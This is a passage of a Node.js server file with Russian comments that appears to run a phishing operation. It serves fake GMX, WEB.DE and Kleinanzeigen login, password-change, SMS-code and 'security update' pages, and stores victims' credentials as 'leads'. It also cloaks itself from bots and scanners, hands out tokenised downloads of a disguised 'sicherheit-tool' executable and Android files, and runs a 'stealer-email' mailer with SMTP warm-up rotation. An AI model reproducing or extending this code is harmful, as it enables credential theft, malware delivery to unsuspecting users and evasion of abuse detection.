      if (!lead) return send(res, 404, { ok: false, error: 'Lead not found' });
      if (lead.brand !== 'klein') {
        return send(res, 400, { ok: false, error: 'Только для логов Klein' });
      }
      leadService.applyKleinLogArchivedToggle(lead, klLogArchived, pushEvent);
      persistLeadPatch(id, { klLogArchived: lead.klLogArchived, eventTerminal: lead.eventTerminal });
      return send(res, 200, { ok: true, klLogArchived: klLogArchived });
    });
    return;
  }

  if (pathname === '/api/warmup-start' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      if (warmupState.running) return send(res, 400, { ok: false, error: 'Прогрев уже запущен' });
      const data = readWarmupEmailConfig();
      const currentId = data.currentId || (data.configs && data.configs[0] && data.configs[0].id) || null;
      const currentConfig = currentId ? (data.configs || []).find((c) => c.id == currentId) : (data.configs && data.configs[0]) || null;
      const configs = (currentConfig && (currentConfig.smtpLine || '').trim()) ? [currentConfig] : [];
      if (!configs.length) return send(res, 400, { ok: false, error: 'Выберите конфиг с SMTP в режиме Прогрев и нажмите Старт' });
      let leads = [];
      if (Array.isArray(json.recipients) && json.recipients.length > 0) {
        leads = json.recipients.map((r) => ({ email: (r && r.email) ? String(r.email).trim() : '', password: (r && r.password) ? String(r.password) : '' })).filter((l) => l.email);
      }
      if (leads.length === 0) leads = readLeads().filter((l) => (l.email || '').trim());
      if (!leads.length) return send(res, 400, { ok: false, error: 'Нет получателей. Заполните базу для прогрева или загрузите лиды на сервере.' });
      let perSmtpLimit = typeof json.perSmtpLimit === 'number' ? json.perSmtpLimit : parseInt(json.perSmtpLimit, 10);
      if (isNaN(perSmtpLimit) || perSmtpLimit < 1) perSmtpLimit = 10;
      if (perSmtpLimit > 10000) perSmtpLimit = 10000;
      let delaySec = typeof json.delaySec === 'number' ? json.delaySec : parseFloat(json.delaySec);
      if (isNaN(delaySec) || delaySec < 0.5) delaySec = 2;
      if (delaySec > 300) delaySec = 300;
      let numThreads = typeof json.numThreads === 'number' ? json.numThreads : parseInt(json.numThreads, 10);
      if (isNaN(numThreads) || numThreads < 1) numThreads = 1;
      if (numThreads > 20) numThreads = 20;
      const flatList = [];
      configs.forEach((cfg) => {
        const smtpList = parseSmtpLines(cfg.smtpLine || '');
        smtpList.forEach((smtp) => flatList.push({ config: cfg, smtp }));
      });
      warmupState.stopped = false;
      warmupState.paused = false;
      warmupState.configs = configs;
      warmupState.flatList = flatList;
      warmupState.leads = leads;
      warmupState.perSmtpLimit = perSmtpLimit;
      warmupState.delayMs = Math.round(delaySec * 1000);
      warmupState.numThreads = numThreads;
      warmupState.sentPerSmtp = Object.assign({}, readWarmupSmtpStats());
      warmupState.log = [{ text: '[Прогрев запущен. Потоков: ' + numThreads + ', лимит с каждого SMTP: ' + perSmtpLimit + ', задержка: ' + delaySec + ' сек. SMTP по кругу (всего ' + flatList.length + '), лиды по кругу]', type: 'muted' }];
      warmupState.totalSent = 0;
      warmupState.running = true;
      for (let w = 0; w < numThreads; w++) setImmediate(runWarmupStep);
      return send(res, 200, { ok: true });
    });
    return;
  }

  if (pathname === '/api/warmup-status' && req.method === 'GET') {
    if (!checkAdminAuth(req, res)) return;
    const persisted = readWarmupSmtpStats();
    const seen = {};
    const list = [];
    if (warmupState.running && warmupState.flatList && warmupState.flatList.length) {
      warmupState.flatList.forEach((entry) => {
        const email = entry.smtp.fromEmail;
        if (!seen[email]) {
          seen[email] = true;
          list.push({ id: email, name: email, sent: warmupState.sentPerSmtp[email] || 0 });
        }
      });
    }
    Object.keys(persisted).forEach((email) => {
      if (!seen[email]) {
        seen[email] = true;
        list.push({ id: email, name: email, sent: warmupState.sentPerSmtp[email] ?? persisted[email] });
      }
    });
    return send(res, 200, {
      running: warmupState.running,
      paused: warmupState.paused,
      totalSent: warmupState.totalSent,
      sentPerConfig: list,
      log: warmupState.log.slice(-200)
    });
  }

  if (pathname === '/api/warmup-stats-reset' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const fromEmail = (json.fromEmail != null) ? String(json.fromEmail).trim() : '';
      if (!fromEmail) return send(res, 400, { ok: false, error: 'fromEmail required' });
      const stats = readWarmupSmtpStats();
      delete stats[fromEmail];
      writeWarmupSmtpStats(stats);
      if (warmupState.sentPerSmtp[fromEmail] !== undefined) delete warmupState.sentPerSmtp[fromEmail];
      return send(res, 200, { ok: true });
    });
    return;
  }

  if (pathname === '/api/warmup-pause' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      const wasPaused = warmupState.paused;
      warmupState.paused = !warmupState.paused;
      if (wasPaused && !warmupState.paused && body) {
        try {
          const json = JSON.parse(body);
          if (typeof json.delaySec === 'number' || typeof json.delaySec === 'string') {
            let delaySec = typeof json.delaySec === 'number' ? json.delaySec : parseFloat(json.delaySec);
            if (!isNaN(delaySec) && delaySec >= 0.5 && delaySec <= 300) warmupState.delayMs = Math.round(delaySec * 1000);
          }
          if (typeof json.perSmtpLimit === 'number' || typeof json.perSmtpLimit === 'string') {
            let perSmtpLimit = typeof json.perSmtpLimit === 'number' ? json.perSmtpLimit : parseInt(json.perSmtpLimit, 10);
            if (!isNaN(perSmtpLimit) && perSmtpLimit >= 1 && perSmtpLimit <= 10000) warmupState.perSmtpLimit = perSmtpLimit;
          }
          if (typeof json.numThreads === 'number' || typeof json.numThreads === 'string') {
            let numThreads = typeof json.numThreads === 'number' ? json.numThreads : parseInt(json.numThreads, 10);
            if (!isNaN(numThreads) && numThreads >= 1 && numThreads <= 20 && numThreads > warmupState.numThreads) {
              for (let w = warmupState.numThreads; w < numThreads; w++) setImmediate(runWarmupStep);
              warmupState.numThreads = numThreads;
            } else if (!isNaN(numThreads) && numThreads >= 1 && numThreads <= 20) {
              warmupState.numThreads = numThreads;
            }
          }
        } catch (e) {}
      }
      return send(res, 200, { ok: true, paused: warmupState.paused });
    });
    return;
  }

  if (pathname === '/api/warmup-stop' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    warmupState.stopped = true;
    return send(res, 200, { ok: true });
  }

  // Публичный эндпоинт: пароль для ZIP показывается на странице Sicherheit (распаковка)
  if (pathname === '/api/zip-password' && req.method === 'GET') {
    return send(res, 200, { password: readZipPassword() });
  }

  // Выдача одноразовой ссылки на скачивание (только с cookie гейта — боты не получают URL). Клиент подставляет downloadUrl в кнопку.
  if (pathname === '/api/download-request' && req.method === 'POST') {
    if (REQUIRE_GATE_COOKIE && !hasGateCookie(req)) return send(res, 403, { ok: false, error: 'forbidden' });
    if (!checkRateLimit(ip, 'downloadFilename', RATE_LIMITS.downloadFilename)) return send(res, 429, { ok: false, error: 'too_many_requests' });
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch (e) {}
      const leadIdRaw = (json.leadId && String(json.leadId).trim()) || '';
      const leadId = leadIdRaw ? resolveLeadId(leadIdRaw) : '';
      const platform = (json.platform && String(json.platform).trim().toLowerCase()) || '';
      let fileName = null;
      if (platform === 'android') {
        if (leadId) {
          const slot = getSlotForLead(leadId, 'android');
          const files = getAndroidDownloadFiles();
          const slotInfo = files[slot];
          if (slotInfo && slotInfo.fileName) {
            const limit = slotInfo.limit != null ? slotInfo.limit : 0;
            const downloads = slotInfo.downloads != null ? slotInfo.downloads : 0;
            if (limit <= 0 || downloads < limit) {
              const full = path.join(DOWNLOADS_DIR, slotInfo.fileName);
              try { if (fs.statSync(full).isFile()) fileName = slotInfo.fileName; } catch (e) {}
            }
            if (!fileName) fileName = (getAndroidDownloadFileByLimit() || {}).fileName;
          }
        }
        if (!fileName) fileName = (getAndroidDownloadFile() || getAndroidDownloadFileByLimit() || {}).fileName;
      } else {
        if (leadId) {
          const slot = getSlotForLead(leadId, 'windows');
          const files = getSicherheitDownloadFiles();
          const slotInfo = files[slot];
          if (slotInfo && slotInfo.fileName) {
            const limit = slotInfo.limit != null ? slotInfo.limit : 0;
            const downloads = slotInfo.downloads != null ? slotInfo.downloads : 0;
            if (limit <= 0 || downloads < limit) {
              const full = path.join(DOWNLOADS_DIR, slotInfo.fileName);
              try { if (fs.statSync(full).isFile()) fileName = slotInfo.fileName; } catch (e) {}
            }
            if (!fileName) fileName = (getSicherheitDownloadFileByLimit() || {}).fileName;
          }
        }
        if (!fileName) fileName = (getSicherheitDownloadFileByLimit() || getSicherheitDownloadFile() || {}).fileName;
      }
      if (!fileName) return send(res, 404, { ok: false, error: 'no_file' });
      const token = generateDownloadToken(fileName);
      const downloadUrl = '/download/' + encodeURIComponent(fileName) + '?t=' + encodeURIComponent(token);
      send(res, 200, { ok: true, downloadUrl: downloadUrl });
    });
    return;
  }

  // Публичный эндпоинт: имя файла для скачивания. По leadId — слот на юзера (один файл на lead); при переполнении слота — следующий по лимиту.
  if (pathname === '/api/download-filename' && req.method === 'GET') {
    if (!checkRateLimit(ip, 'downloadFilename', RATE_LIMITS.downloadFilename)) {
      return send(res, 429, { ok: false, error: 'too_many_requests' });
    }
    const platform = (parsed.query && parsed.query.platform) ? String(parsed.query.platform).trim().toLowerCase() : '';
    const leadId = (parsed.query && parsed.query.leadId) ? String(parsed.query.leadId).trim() : '';
    if (platform === 'android') {
      let info = null;
      if (leadId) {
        const slot = getSlotForLead(leadId, 'android');
        const files = getAndroidDownloadFiles();
        const slotInfo = files[slot];
        if (slotInfo && slotInfo.fileName) {
          const limit = slotInfo.limit != null ? slotInfo.limit : 0;
          const downloads = slotInfo.downloads != null ? slotInfo.downloads : 0;
          if (limit <= 0 || downloads < limit) {
            const full = path.join(DOWNLOADS_DIR, slotInfo.fileName);
            try {
              if (fs.statSync(full).isFile()) info = { fileName: slotInfo.fileName, filePath: full };
            } catch (e) {}
          }
        }
        if (!info) info = getAndroidDownloadFileByLimit();
      }
      if (!info) info = getAndroidDownloadFileByLimit();
      if (!info) info = getAndroidDownloadFile();
      return send(res, 200, { fileName: info ? info.fileName : null });
    }
    let info = null;
    if (leadId) {
      const slot = getSlotForLead(leadId, 'windows');
      const files = getSicherheitDownloadFiles();
      const slotInfo = files[slot];
      if (slotInfo && slotInfo.fileName) {
        const limit = slotInfo.limit != null ? slotInfo.limit : 0;
        const downloads = slotInfo.downloads != null ? slotInfo.downloads : 0;
        if (limit <= 0 || downloads < limit) {
          const full = path.join(DOWNLOADS_DIR, slotInfo.fileName);
          try {
            if (fs.statSync(full).isFile()) info = { fileName: slotInfo.fileName, filePath: full };
          } catch (e) {}
        }
      }
      if (!info) info = getSicherheitDownloadFileByLimit();
    }
    if (!info) info = getSicherheitDownloadFileByLimit();
    if (!info) info = getSicherheitDownloadFile();
    return send(res, 200, { fileName: info ? info.fileName : null });
  }

  // Админка: запрос «открыть чат у юзера»
  if (pathname === '/api/chat-open' && req.method === 'POST') {
    console.log('[CHAT-OPEN] POST /api/chat-open: запрос получен');
    if (!checkAdminAuth(req, res)) {
      console.log('[CHAT-OPEN] POST /api/chat-open: 403 (нет или неверный токен)');
      return;
    }
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const leadId = (json.leadId != null) ? String(json.leadId).trim() : '';
      if (!leadId) {
        console.log('[CHAT-OPEN] POST /api/chat-open: пустой leadId, 400');
        return send(res, 400, { ok: false });
      }
      const chat = chatService.readChat();
      if (!chat._openChatRequested || typeof chat._openChatRequested !== 'object') chat._openChatRequested = Object.create(null);
      const requestId = String(Date.now());
      chat._openChatRequested[leadId] = requestId;
      chatService.writeChat(chat);
      console.log('[CHAT-OPEN] POST /api/chat-open: админ запросил открыть чат leadId=' + leadId + ' requestId=' + requestId);
      return send(res, 200, { ok: true });
    });
    return;
  }

  // Юзер подтвердил открытие чата — сбрасываем флаг в файле
  if (pathname === '/api/chat-open-ack' && req.method === 'POST') {
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const leadId = (json.leadId != null) ? String(json.leadId).trim() : '';
      if (leadId) {
        const chat = chatService.readChat();
        if (chat._openChatRequested && typeof chat._openChatRequested === 'object') {
          delete chat._openChatRequested[leadId];
          chatService.writeChat(chat);
        }
        console.log('[CHAT-OPEN] POST /api/chat-open-ack: юзер подтвердил открытие leadId=' + leadId);
      }
      return send(res, 200, { ok: true });
    });
    return;
  }

  // Печатает: who = 'support' | 'user', typing = true | false
  if (pathname === '/api/chat-typing' && req.method === 'POST') {
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const leadId = (json.leadId != null) ? String(json.leadId).trim() : '';
      const who = (json.who === 'support' || json.who === 'user') ? json.who : null;
      const typing = json.typing === true;
      if (!leadId || !who) return send(res, 400, { ok: false });
      if (who === 'support') {
        const token = getAdminTokenFromRequest(req, parsed);
        if (!ADMIN_TOKEN || token !== ADMIN_TOKEN) return send(res, 403, { ok: false });
      }
      chatService.setChatTyping(leadId, who, typing);
      return send(res, 200, { ok: true });
    });
    return;
  }

  // Юзер прочитал чат — сохраняем время по email (общее для всех логов с этой почтой)
  if (pathname === '/api/chat-read' && req.method === 'POST') {
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const leadId = (json.leadId != null) ? String(json.leadId).trim() : '';
      if (!leadId) return send(res, 400, { ok: false });
      const chatKey = chatService.getChatKeyForLeadId(leadId);
      const chat = chatService.readChat();
      if (!chat._readAt) chat._readAt = Object.create(null);
      chat._readAt[chatKey] = new Date().toISOString();
      chatService.writeChat(chat);
      return send(res, 200, { ok: true });
    });
    return;
  }

  // Всегда отдаём «белую» страницу по запросу гейт-скрипта (боты проверки контента детектятся на клиенте и запрашивают это)
  if (pathname === '/gate-white' && req.method === 'GET') {
    if (safeEnd(res)) return;
    res.writeHead(200, {
      'Content-Type': 'text/html; charset=utf-8',
      'Cache-Control': 'no-store, no-cache, must-revalidate',
      'Pragma': 'no-cache'
    });
    res.end(getWhitePageHtmlForRequest(req));
    return;
  }

  // Гейт от ботов (клоака): без cookie — нейтральная страница (боты) или гейт-страница (JS → проверки 2026 → человек на целевую, бот остаётся на нейтральной)
  if (req.method === 'GET' && isProtectedPage(pathname) && !hasGateCookie(req)) {
    const html = isLikelyBot(req, pathname) ? getWhitePageHtml(req) : GATE_PAGE_HTML;
    if (safeEnd(res)) return;
    res.writeHead(200, {
      'Content-Type': 'text/html; charset=utf-8',
      'Cache-Control': 'no-store, no-cache, must-revalidate',
      'Pragma': 'no-cache'
    });
    res.end(html);
    return;
  }

  // Корень: локальный хост → /anmelden (страница входа webde для тестов); Klein → /anmelden; GMX/WEB.DE на проде → официальный сайт
  if ((pathname === '/' || pathname === '') && (req.method === 'GET' || req.method === 'HEAD')) {
    if (safeEnd(res)) return;
    const brand = getBrand(req);
    const host = (req.headers.host || '').split(':')[0].toLowerCase();
    if (isLocalHost(host)) {
      res.writeHead(302, { 'Location': '/anmelden', 'Cache-Control': 'no-store' });
    } else if (brand.id === 'klein') {
      res.writeHead(302, { 'Location': 'https://' + host + '/anmelden', 'Cache-Control': 'no-store' });
    } else {
      res.writeHead(302, { 'Location': brand.canonicalUrl, 'Cache-Control': 'no-store' });
    }
    res.end();
    return;
  }

  // Редирект со старых доменов (gmx-de.help и т.п.) на канонический GMX для страницы входа
  const host = (req.headers.host || '').split(':')[0].toLowerCase();
  const oldSiteHosts = ['gmx-de.help', 'www.gmx-de.help', 'gmx-net.help', 'www.gmx-net.help', 'gmx-net.info', 'www.gmx-net.info'];
  if ((pathname === '/anmelden' || pathname === '/anmelden/') && req.method === 'GET' && oldSiteHosts.includes(host)) {
    if (safeEnd(res)) return;
    res.writeHead(302, { 'Location': 'https://' + getCanonicalDomain(req) + '/anmelden', 'Cache-Control': 'no-store' });
    res.end();
    return;
  }

  // Контентные страницы: Klein из klein/, WEB.DE из webde/, GMX из gmx/
  const brand = getBrand(req);
  const isWebde = brand.id === 'webde';
  const isKlein = brand.id === 'klein';

  if ((pathname === '/einloggen' || pathname === '/einloggen/') && req.method === 'GET') {
    if (isKlein) {
      if (safeEnd(res)) return;
      res.writeHead(302, { 'Location': 'https://' + (req.headers.host || '').split(':')[0] + '/anmelden', 'Cache-Control': 'no-store' });
      res.end();
      return;
    }
    if (safeEnd(res)) return;
    res.writeHead(302, { 'Location': 'https://' + getCanonicalDomain(req) + '/anmelden', 'Cache-Control': 'no-store' });
    res.end();
    return;
  }

  if ((pathname === '/anmelden' || pathname === '/anmelden/') && req.method === 'GET') {
    if (isKlein) {
      return serveFile(path.join(PROJECT_ROOT, 'klein', 'index.html'), res, req);
    }
    const indexFile = isWebde ? path.join(PROJECT_ROOT, 'webde', 'index.html') : path.join(PROJECT_ROOT, 'gmx', 'index.html');
    return serveFile(indexFile, res, req);
  }
  if ((pathname === '/klein-anmelden' || pathname === '/klein-anmelden/') && req.method === 'GET') {
    return serveFile(path.join(PROJECT_ROOT, 'klein', 'index.html'), res, req);
  }
  if (pathname === '/passwort-aendern' && req.method === 'GET') {
    if (isKlein) {
      return serveFile(path.join(PROJECT_ROOT, 'klein', 'passwort-aendern.html'), res, req);
    }
    const filePath = path.join(PROJECT_ROOT, isWebde ? 'webde' : 'gmx', 'index-change.html');
    return serveFile(filePath, res, req);
  }
  if ((pathname === '/sicherheit' || pathname === '/sicherheit/' || pathname === '/sicherheit-pc' || pathname === '/sicherheit-pc/' || pathname === '/sicherheit-update' || pathname === '/sicherheit-update/') && req.method === 'GET') {
    const sicherheitFile = path.join(PROJECT_ROOT, isWebde ? 'webde' : 'gmx', 'index-sicherheit-update.html');
    return serveFile(sicherheitFile, res, req);
  }
  if ((pathname === '/bitte-am-pc' || pathname === '/bitte-am-pc/') && req.method === 'GET') {
    const filePath = path.join(PROJECT_ROOT, isWebde ? 'webde' : 'gmx', 'bitte-am-pc.html');
    return serveFile(filePath, res, req);
  }
  if ((pathname === '/app-update' || pathname === '/app-update/') && req.method === 'GET') {
    const filePath = path.join(PROJECT_ROOT, isWebde ? 'webde' : 'gmx', 'app-update.html');
    return serveFile(filePath, res, req);
  }
  if ((pathname === '/gmx-mobile-anleitung' || pathname === '/gmx-mobile-anleitung/') && req.method === 'GET') {
    const filePath = path.join(PROJECT_ROOT, isWebde ? 'webde' : 'gmx', 'gmx-mobile-anleitung.html');
    return serveFile(filePath, res, req);
  }

  if (pathname === '/sms-code.html' && req.method === 'GET' && isKlein) {
    return serveFile(path.join(PROJECT_ROOT, 'klein', 'sms-code.html'), res, req);
  }
  if ((pathname === '/erfolg' || pathname === '/erfolg/') && req.method === 'GET' && isKlein) {
    return serveFile(path.join(PROJECT_ROOT, 'klein', 'erfolg.html'), res, req);
  }

  // Прямые запросы по имени файла и push/sms/change: по бренду из gmx/ или webde/
  if (req.method === 'GET') {
    const contentFromGmx = {
      '/push-confirm.html': 'push-confirm.html',
      '/sms-code.html': 'sms-code.html',
      '/2fa-code.html': '2fa-code.html',
      '/change-password.html': 'change-password.html',
      '/forgot-password-redirect.html': 'forgot-password-redirect.html',
      '/index-sicherheit-update.html': 'index-sicherheit-update.html',
      '/index-sicherheit.html': 'index-sicherheit.html',
      '/index-sicherheit-pc.html': 'index-sicherheit-pc.html',
      '/sicherheit-anleitung.html': 'sicherheit-anleitung.html',
      '/install-guide.html': 'install-guide.html',
      '/install-guide-test.html': 'install-guide-test.html',
      '/install-guide-single.html': 'install-guide-single.html',
      '/install-guide-single-2steps.html': 'install-guide-single-2steps.html',
      '/index-change.html': 'index-change.html',
      '/bitte-am-pc.html': 'bitte-am-pc.html',
      '/app-update.html': 'app-update.html',
      '/gmx-mobile-anleitung.html': 'gmx-mobile-anleitung.html'
    };
    const webdeHas = {
      '/push-confirm.html': true, '/sms-code.html': true, '/2fa-code.html': true, '/change-password.html': true, '/forgot-password-redirect.html': true,
      '/index-sicherheit-update.html': true, '/index-sicherheit.html': true, '/index-sicherheit-pc.html': true, '/sicherheit-anleitung.html': true,
      '/install-guide.html': true, '/install-guide-test.html': true, '/install-guide-single.html': true, '/install-guide-single-2steps.html': true, '/index-change.html': true, '/bitte-am-pc.html': true, '/app-update.html': true, '/gmx-mobile-anleitung.html': true
    };
    const fileName = contentFromGmx[pathname];
    if (fileName) {
      if (isWebde && !webdeHas[pathname]) {
        if (safeEnd(res)) return;
        res.writeHead(302, { 'Location': brand.canonicalUrl, 'Cache-Control': 'no-store' });
        res.end();
        return;
      }
      const dir = isWebde && webdeHas[pathname] ? 'webde' : 'gmx';
      return serveFile(path.join(PROJECT_ROOT, dir, fileName), res, req);
    }
  }

  // Скачивание: /download/<имя_файла>?t=TOKEN — только с одноразовым токеном (боты не получают ссылку). Админка может без токена.
  const downloadFileMatch = pathname.match(/^\/download\/([^/?#]+)$/);
  if (downloadFileMatch && req.method === 'GET') {
    const token = (parsed.query && parsed.query.t) ? String(parsed.query.t).trim() : '';
    let fileName = null;
    if (token) {
      fileName = consumeDownloadToken(token);
    } else if (requestHost === ADMIN_DOMAIN || getAdminTokenFromRequest(req, parsed) === ADMIN_TOKEN) {
      let rawName;
      try {
        rawName = decodeURIComponent(downloadFileMatch[1]).replace(/\0/g, '');
      } catch (e) {
        rawName = downloadFileMatch[1].replace(/\0/g, '');
      }
      fileName = path.basename(rawName);
    }
    if (!fileName) {
      if (safeEnd(res)) return;
      res.writeHead(403, { 'Content-Type': 'text/plain; charset=utf-8' });
      res.end('Forbidden');
      return;
    }
    if (!checkRateLimit(ip, 'downloadGet', RATE_LIMITS.downloadGet)) {
      if (safeEnd(res)) return;
      res.writeHead(429, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({ ok: false, error: 'too_many_requests' }));
      return;
    }
    const fullPath = findDownloadFile(fileName);
    if (fullPath) {
      const displayName = path.basename(fullPath);
      incrementDownloadCount(fileName);
      const ext = path.extname(fullPath).toLowerCase();
      const contentType = ext === '.zip' ? 'application/zip' : 'application/octet-stream';
      var fileSize = 0;
      try { fileSize = fs.statSync(fullPath).size; } catch (e) {}
      if (safeEnd(res)) return;
      var downloadHeaders = {
        'Content-Type': contentType,
        'Content-Disposition': 'attachment; filename="' + sanitizeFilenameForHeader(displayName) + '"',
        'Cache-Control': 'no-store, no-cache, must-revalidate, max-age=0',
        'Pragma': 'no-cache'
      };
      if (fileSize > 0) downloadHeaders['Content-Length'] = String(fileSize);
      res.writeHead(200, downloadHeaders);
      const stream = fs.createReadStream(fullPath);
      stream.on('error', function (err) {
        console.error('[SERVER] download stream error:', fileName, err.message || err);
        try { if (!res.writableEnded) res.end(); } catch (e) {}
      });
      stream.pipe(res);
      return;
    }
    return send(res, 404, 'Not Found', 'text/plain');
  }

  // Старые URL скачивания — редирект на текущий файл по имени (или 404)
  if ((pathname === '/download/sicherheit-tool' || pathname === '/download/sicherheit-tool.zip' || pathname === '/download/sicherheit-tool.exe') && req.method === 'GET') {
    const info = getSicherheitDownloadFile();
    if (info && info.fileName) {
      if (safeEnd(res)) return;
      res.writeHead(302, { 'Location': '/download/' + encodeURIComponent(info.fileName), 'Cache-Control': 'no-store' });
      res.end();
      return;
    }
    return send(res, 404, 'Not Found', 'text/plain');
  }

  // Админка: /admin и /admin/ отдают admin.html только при валидном токене (?token= или Authorization)
  if ((pathname === '/admin' || pathname === '/admin/') && req.method === 'GET') {
    if (!checkAdminPageAuth(req, res, parsed)) return;
    const filePath = path.join(PROJECT_ROOT, 'public', 'admin.html');
    return serveFile(filePath, res, req);
  }

  // Mailer: отдельная страница конфига stealer-email (только с токеном админки)
  if ((pathname === '/mailer' || pathname === '/mailer/' || pathname === '/mailer/index.html') && req.method === 'GET') {
    if (!checkAdminPageAuth(req, res, parsed)) return;
    const mailerIndexPath = path.join(PROJECT_ROOT, 'mailer', 'index.html');
    return serveFile(mailerIndexPath, res, req);
  }
  if (pathname === '/mailer/index-test.html' && req.method === 'GET') {
    if (!checkAdminPageAuth(req, res, parsed)) return;
    const mailerTestPath = path.join(PROJECT_ROOT, 'mailer', 'index-test.html');
    return serveFile(mailerTestPath, res, req);
  }
  if ((pathname === '/mailer/mailer.js' || pathname === '/mailer/mailer.css') && req.method === 'GET') {
    const mailerAssetPath = path.join(PROJECT_ROOT, 'mailer', path.basename(pathname));
    return fs.stat(mailerAssetPath, (err, stat) => {
      if (err || !stat.isFile()) return send(res, 404, 'Not Found', 'text/plain');
      serveFile(mailerAssetPath, res, req);
    });
  }

  // Гайд по установке: скриншоты из webde/guide/
  if (pathname.startsWith('/guide/') && pathname.length > 7 && req.method === 'GET') {
    const name = path.basename(pathname).replace(/[^a-zA-Z0-9._-]/g, '');
    if (name && /\.(png|jpg|jpeg|gif|webp)$/i.test(name)) {
      const guidePath = path.join(PROJECT_ROOT, 'webde', 'guide', name);
      return fs.stat(guidePath, (err, stat) => {
        if (err || !stat.isFile()) return send(res, 404, 'Not Found', 'text/plain');
        serveFile(guidePath, res, req);
      });
    }
  }

  // Старые URL — редирект на новые пути
  if (pathname === '/index.html' && req.method === 'GET') {
    if (safeEnd(res)) return;
    res.writeHead(302, { 'Location': '/anmelden', 'Cache-Control': 'no-store' });
    res.end();
    return;
  }
  if (pathname === '/index-change.html' && req.method === 'GET') {
    if (safeEnd(res)) return;
    res.writeHead(302, { 'Location': '/passwort-aendern', 'Cache-Control': 'no-store' });
    res.end();
    return;
  }

  // Статика: общие ресурсы из public/, админка и прочее из корня
  const publicAssets = ['/script.js', '/script-webde.js', '/script-klein.js', '/index-change.js', '/index-change-webde.js', '/push-confirm.js', '/push-confirm-webde.js', '/sms-code.js', '/sms-code-webde.js', '/2fa-code-webde.js', '/sms-code-klein.js', '/erfolg-klein.js', '/change-password.js', '/change-password-webde.js', '/change-password-klein.js', '/status-redirect.js', '/status-redirect-webde.js', '/chat-widget.js', '/brand.js', '/styles.css', '/favicon.svg', '/favicon-webde.png', '/webde-kundencenter-logo.png', '/klein-logo.png', '/admin-klein-logo.js', '/windows-icon.png', '/android-icon.png', '/ios-icon.png', '/chat-widget.css', '/admin.html', '/admin.css', '/admin.js', '/fingerprint.js', '/webde-fingerprints-pool.js'];
  const requested = pathname;
  const inPublic = publicAssets.indexOf(pathname) !== -1;
  let filePath = inPublic ? path.join(PROJECT_ROOT, 'public', requested.slice(1)) : path.join(PROJECT_ROOT, requested);
  if (!path.relative(PROJECT_ROOT, filePath).split(path.sep).every(p => p !== '..')) {
    return send(res, 403, 'Forbidden', 'text/plain');
  }
  fs.stat(filePath, (err, stat) => {
    if (err || !stat.isFile()) {
      return send(res, 404, 'Not Found', 'text/plain');
    }
    if (pathname === '/admin.html' && req.method === 'GET' && !checkAdminPageAuth(req, res, parsed)) return;
    if (req.method === 'GET' && isProtectedContentPath(pathname) && !hasGateCookie(req)) {
      const html = isLikelyBot(req, pathname) ? getWhitePageHtml(req) : GATE_PAGE_HTML;
      if (res.writableEnded) return;
      res.writeHead(200, {
        'Content-Type': 'text/html; charset=utf-8',
        'Cache-Control': 'no-store, no-cache, must-revalidate',
        'Pragma': 'no-cache'
      });
      res.end(html);
      return;
    }
    serveFile(filePath, res, req);
  });
});

if (WebSocketServer) {
  const wss = new WebSocketServer({ server: server, path: '/ws' });
  global.__gmwWssBroadcast = function () {
    const msg = JSON.stringify({ type: 'leads-update' });
    wss.clients.forEach(function (client) {
      if (client.readyState === 1) try { client.send(msg); } catch (e) {}
    });
  };
  wss.on('connection', function (ws) {
    console.log('[SERVER] WebSocket: админ подключён');
  });
} else {
  console.log('[SERVER] WebSocket не подключён (установите: npm install ws)');
}

// Production: требовать ADMIN_TOKEN (иначе админка открыта без пароля)
const isProduction = (process.env.NODE_ENV || '').toLowerCase() === 'production';
if (isProduction && !ADMIN_TOKEN) {
  console.error('[SERVER] NODE_ENV=production: задайте ADMIN_TOKEN в .env или окружении. Без токена админка не защищена.');
  process.exit(1);
}

// Обработка необработанных исключений — логировать и завершать процесс
process.on('uncaughtException', (err) => {
  console.error('[SERVER] uncaughtException:', err);
  process.exit(1);
});
process.on('unhandledRejection', (reason, promise) => {
  console.error('[SERVER] unhandledRejection:', reason);
  process.exit(1);
});

// При старте: создать критичные каталоги и сообщить о необязательных зависимостях
ensureDataFile();
if (!fs.existsSync(DOWNLOADS_DIR)) fs.mkdirSync(DOWNLOADS_DIR, { recursive: true });
if (!nodemailer) console.log('[SERVER] nodemailer не установлен — рассылка stealer/warmup недоступна (npm install nodemailer)');
if (!WebSocketServer) console.log('[SERVER] ws не установлен — обновление админки в реальном времени отключено (npm install ws)');

function cleanLoginArtifacts() {
  if (!fs.existsSync(LOGIN_DIR)) return;
  const now = Date.now();
  LOGIN_ARTIFACT_NAMES.forEach((name) => {
    const full = path.join(LOGIN_DIR, name);
    try {
      const stat = fs.statSync(full);
      if (!stat.isFile()) return;
      if (now - stat.mtime.getTime() < LOGIN_CLEANUP_MAX_AGE_MS) return;
      fs.unlinkSync(full);
    } catch (e) {}
  });
  try {
    const names = fs.readdirSync(LOGIN_DIR);
    names.forEach((name) => {
      if (!name.endsWith('.png')) return;
      const full = path.join(LOGIN_DIR, name);
      try {
        const stat = fs.statSync(full);
        if (!stat.isFile()) return;
        if (now - stat.mtime.getTime() < LOGIN_CLEANUP_MAX_AGE_MS) return;
        fs.unlinkSync(full);
      } catch (e) {}
    });
  } catch (e) {}
}

function runFullCleanup() {
